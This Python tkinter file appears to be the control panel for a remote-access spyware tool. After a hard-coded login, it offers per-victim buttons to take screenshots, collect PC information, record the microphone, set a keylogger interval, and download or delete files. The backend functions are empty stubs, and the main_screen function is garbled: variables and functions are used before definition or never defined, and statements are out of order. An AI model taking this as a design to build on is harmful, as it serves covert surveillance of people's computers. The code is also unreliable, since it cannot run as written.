import hashlib
from tkinter import *
from tkinter import messagebox
from PIL import Image, ImageTk
from functools import partial

import os
from os.path import join

root = Tk()
root.title('Login')
root.geometry('925x500+300+200')
root.configure(bg="#fff")
root.resizable(False, False)


def request_folder_names():
    pass


def request_files(folder_name):
    pass


def download(path):
    pass


def delete(path):
    pass


def request_screenshot(folder_name):
    pass


def request_pcinfo(folder_name):
    pass


def request_audio(folder_name, mic_time_entry):
    time = mic_time_entry.get()
    if time:
        if time.isdigit():
            pass
        else:
            messagebox.showerror(title="ERROR", message="Write in the entry only numbers")
    else:
        messagebox.showerror(title="ERROR", message="Please set the recording length")


def change_keylogger_impolse(folder_name, new_impolse):
    time = new_impolse.get()
    if time:
        if time.isdigit():
            pass
        else:
            messagebox.showerror(title="ERROR", message="Write in the entry only numbers")
    else:
        messagebox.showerror(title="ERROR", message="Please set the impolse time")


def sign_in():

    hashed_username = "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"
    hashed_password = "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4"
    username = user.get()
    password = code.get()
    if hashlib.sha256(username.encode('utf-8')).hexdigest() == hashed_username and hashlib.sha256(
            password.encode('utf-8')).hexdigest() == hashed_password:
        root.destroy()
        main_screen()
    else:
        messagebox.showerror(title="ERROR", message="wrong password or username")


def refresh_main_screen(screen):
    screen.destroy()
    main_screen()


def main_screen():
    root = Tk()
    root.title('Data')
    root.geometry('600x500+300+200')
    root.configure(bg="#F4E9DD")
    root.resizable(False, False)

    frame = Frame(root, bg="white")
    frame.place(relwidth=0.694, relheight=0.8, relx=0.15, rely=0.1)

    folders = [".idea", "moyffb", "(123.,456g456sd456sg)"]

    delete_icon = Image.open("delete.png")
    delete_icon.thumbnail((23, 23))
    delete_icon = ImageTk.PhotoImage(delete_icon)

    download_icon = Image.open("download.png")
    download_icon.thumbnail((23, 23))
    download_icon = ImageTk.PhotoImage(download_icon)

    refresh_icon = Image.open("refresh.png")
    refresh_icon.thumbnail((50, 50))
    refresh_icon = ImageTk.PhotoImage(refresh_icon)
    refresh_button = Button(root, image=refresh_icon, border=0.5, command=refresh)
    refresh_button.place(x=10, y=10)

    for i in range(len(file_names)):
        # The partial function enables to functions with args to be used in button.command
        folder_label = Label(frame1, text=file_names[i], bg="grey", width=51, height=1, borderwidth=3,
                             relief="ridge")
        folder_label.grid(row=i, column=0)

        special_function = partial(delete, folder_name + "\\" + file_names[i])
        delete_file_button = Button(frame1, image=delete_icon, border=0, command=special_function)
        delete_file_button.grid(row=i, column=1)

        download_folder_button = Button(frame1, image=download_icon, border=0)
        download_folder_button.grid(row=i, column=2)
        screen.mainloop()


        file_names = [f for f in os.listdir(folder_name) if os.path.isfile(join(folder_name, f))]

        screen = Toplevel(root)
        screen.title(folder_name)
        screen.geometry('600x600+300+200')
        screen.resizable(False, False)
        screen.configure(bg="#F4E9DD")
        frame1 = Frame(screen, bg="white")
        frame1.place(relwidth=0.694, relheight=0.8, relx=0.15, rely=0.02)

        # SCREEN-SHOT BUTTON
        special_function_screen_shot = partial(request_screenshot, folder_name)
        screenshot_button = Button(screen, text="Screen-Shot", bg="#9f81f0", width=10,
                                   command=special_function_screen_shot)
        screenshot_button.place(x=130, y=500)

        # PC-INFO BUTTON
        special_function_pc_info = partial(request_pcinfo, folder_name)
        pcInfo_button = Button(screen, text="PC-info", bg="#9f81f0", width=10, command=special_function_pc_info)
        pcInfo_button.place(x=130, y=540)

        # MIC-RECORDER BUTTON

        mic_time_entry = Entry(screen, width=7, border=0.5)
        mic_time_entry.place(x=430, y=502)
        special_function_microphone = partial(request_audio, folder_name, mic_time_entry)
        microphone_button = Button(screen, text="Mic-record", bg="#9f81f0", width=10,
                                   command=special_function_microphone)
        microphone_button.place(x=350, y=500)

        # KEYLOGGER BUTTON
        keylogger_impulse = Entry(screen, width=7, border=0.5)
        keylogger_impulse.place(x=430, y=542)
        special_function_keylogger = partial(change_keylogger_impolse, folder_name, keylogger_impulse)
        keylogger_button = Button(screen, text="key-logger", bg="#9f81f0", width=10, command=special_function_keylogger)
        keylogger_button.place(x=350, y=540)

        # Refresh button
        def refresh():
            screen.destroy()
        open_folder(folder_name)



        refresh_button1 = Button(root, image=refresh_icon, border=0.5)
        refresh_button1.place(x=10, y=10)
        for i in range(len(folders)):
            # The partial function enables to functions with args to be used in button.command
            special_function = partial(open_folder, folders[i])
            folder_button = Button(frame, text=folders[i], bg="grey", width=51, height=1, border=0.5,
                                   command=special_function)
            folder_button.grid(row=i, column=0)

            # The partial function enables to functions with args to be used in button.command

            special_function = partial(delete, folders[i])
            delete_folder_button = Button(frame, image=delete_icon, border=0, command=special_function)
            delete_folder_button.grid(row=i, column=1)

            download_folder_button = Button(frame, image=download_icon, border=0)
            download_folder_button.grid(row=i, column=2)

        root.mainloop()
    open_folder()

img = PhotoImage(file='login2.png')
Label(root, image=img, bg="white").place(x=50, y=50)

frame = Frame(root, width=350, height=350, bg="white")
frame.place(x=480, y=70)

heading = Label(frame, text='Sing in', fg='#444d87', bg='white', font=('Microsoft YaHei UI Light', 23, 'bold'))
heading.place(x=100, y=5)

icon = PhotoImage(file="icon1.png")
root.iconphoto(False, icon)


# --------------------------USER-NAME----------------------------------------------
def on_enter(e):
    user.delete(0, 'end')


def on_leave(e):
    name = user.get()
    if name == '':
        user.insert(0, 'Username')


user = Entry(frame, width=25, fg='black', border=0, font=('Microsoft YaHei UI Light', 11))
user.place(x=30, y=80)
user.insert(0, 'Username')
Frame(frame, width=295, height=2, bg='black').place(x=25, y=107)
user.bind('<FocusIn>', on_enter)
user.bind('<FocusOut>', on_leave)


# --------------------------------------------------------------------------------

# --------------------------PASSWORD----------------------------------------------
def on_enter(e):
    code.delete(0, 'end')


def on_leave(e):
    name = code.get()
    if name == '':
        code.insert(0, 'Password')


code = Entry(frame, width=25, fg='black', border=0, font=('Microsoft YaHei UI Light', 11))
code.place(x=30, y=150)
code.insert(0, 'Password')
Frame(frame, width=295, height=2, bg='black').place(x=25, y=177)
code.bind('<FocusIn>', on_enter)
code.bind('<FocusOut>', on_leave)
# --------------------------------------------------------------------------------

Button(frame, width=39, pady=7, text='Sing in', bg='#444d87', fg='white', border=0, command=sign_in).place(x=35, y=204)
label = Label(frame, text="Don't have a account?  Well it's your problem", fg='black', bg='white',
              font=('Microsoft YaHei UI Light', 9))
label.place(x=50, y=250)

root.mainloop()
